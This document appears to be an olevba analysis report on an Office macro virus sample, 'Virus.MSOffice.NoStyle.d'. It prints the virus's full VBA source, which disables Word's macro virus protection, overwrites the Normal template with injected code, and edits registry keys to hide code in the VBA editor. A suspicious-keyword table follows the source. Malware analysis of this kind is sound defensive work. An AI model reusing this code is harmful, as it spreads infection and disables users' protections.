olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSOffice.NoStyle.d
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./Virus.MSOffice.NoStyle.d 
in file: ./Virus.MSOffice.NoStyle.d - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
On Error Resume Next
Set mirage = WScript.CreateObject("Word.Application")
mirage.Options.VirusProtection = 0
mirage.Options.SaveNormalPrompt = 0
For x = 1 To mirage.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
mirage.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1
Next
mirage.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile "C:\WINDOWS\SYSTEM\mirage.sys"
mirage.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, 4
mirage.NormalTemplate.Save
mirage.Application.Quit
Set WSHShell = WScript.CreateObject("WScript.Shell")
WSHShell.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MIRAGE"
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\CodeBackColors","1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office\CodeForeColors","1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel\Options6",""
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel\Options6",""
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

